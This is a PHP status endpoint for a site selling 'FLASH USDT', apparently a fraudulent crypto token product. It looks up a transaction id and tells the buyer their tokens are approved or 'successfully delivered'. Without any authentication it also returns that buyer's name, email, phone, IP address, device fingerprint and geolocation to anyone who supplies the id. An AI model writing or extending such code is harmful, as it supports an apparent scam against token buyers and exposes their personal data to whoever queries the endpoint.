<?php
/* FLASH USDT — verify_status.php (extended e-sign compatible) */
header('Content-Type: application/json; charset=utf-8');
define('PAY_FILE', __DIR__ . '/payments.json');

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Pragma: no-cache");
header("Expires: 0");

$txid = strtolower(trim($_GET['txid'] ?? ''));
if ($txid === '') {
  echo json_encode(['ok' => false, 'error' => 'NO_TXID']);
  exit;
}

$response = ['ok' => false, 'status' => 'pending', 'txid' => $txid];
if (!file_exists(PAY_FILE)) { echo json_encode($response); exit; }

$raw = file_get_contents(PAY_FILE);
if ($raw === false || $raw === '') { echo json_encode($response); exit; }

$data = json_decode($raw, true);
if (!is_array($data) || !isset($data[$txid])) { echo json_encode($response); exit; }

$rec = $data[$txid];

// 🔹 Durum ve aşama haritası
$status = strtolower(trim($rec['status'] ?? 'pending'));
$allowed = ['pending', 'processing', 'approved', 'delivered', 'rejected'];
if (!in_array($status, $allowed, true)) $status = 'pending';

$stageMap = [
  'pending'    => 1,
  'processing' => 2,
  'approved'   => 3,
  'delivered'  => 4,
  'rejected'   => -1
];
$stage = $stageMap[$status] ?? 1;

// 🔹 Dinamik mesaj
switch ($status) {
  case 'delivered':
    $bonusMessage = '🎉 Your FLASH USDT has been successfully delivered to your wallet.';
    break;
  case 'approved':
    $bonusMessage = '✅ Payment verified and approved. Preparing secure transfer...';
    break;
  case 'processing':
    $bonusMessage = '🔧 Processing your transaction...';
    break;
  case 'rejected':
    $bonusMessage = '❌ Transaction rejected or invalid.';
    break;
  default:
    $bonusMessage = '⏳ Awaiting blockchain confirmation...';
    break;
}

// 🔹 Kullanıcı verilerini toparla
$meta = $rec['meta'] ?? [];
$user_ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$user_lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'unknown';

$user_fullname  = $rec['user_fullname'] ?? ($meta['fullname'] ?? '');
$user_email     = $rec['user_email'] ?? ($meta['email'] ?? '');
$user_phone     = $rec['user_phone'] ?? ($meta['phone'] ?? '');
$repay_address  = $rec['repayment_address'] ?? ($meta['repay_address'] ?? '');
$device_fp      = $meta['device_fp'] ?? '';
$geo_location   = $meta['geo'] ?? '';
$browser_hash   = md5($user_agent . $user_ip . date('Y-m-d'));

// 🔹 Genişletilmiş JSON çıktısı
echo json_encode([
  'ok'                => true,
  'txid'              => $txid,
  'status'            => $status,
  'stage'             => $stage,
  'product'           => $rec['product'] ?? '—',
  'amount'            => $rec['amount'] ?? '—',
  'price'             => $rec['price'] ?? '—',
  'wallet'            => $rec['wallet'] ?? '—',
  'network'           => $rec['network'] ?? 'TRC20',
  'user_address'      => $rec['user_address'] ?? '—',
  'deposit_address'   => $rec['deposit_address'] ?? '—',
  'repayment_address' => $repay_address ?: 'TBaEXAMPLERepayADDR12345',
  'updated_at'        => $rec['updated_at'] ?? ($rec['date'] ?? ''),
  'meta' => [
    'fullname'      => $user_fullname,
    'email'         => $user_email,
    'phone'         => $user_phone,
    'ip_address'    => $user_ip,
    'device_fp'     => $device_fp,
    'user_agent'    => $user_agent,
    'language'      => $user_lang,
    'geo'           => $geo_location,
    'browser_hash'  => $browser_hash
  ],
  'message' => $bonusMessage
], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);

?>
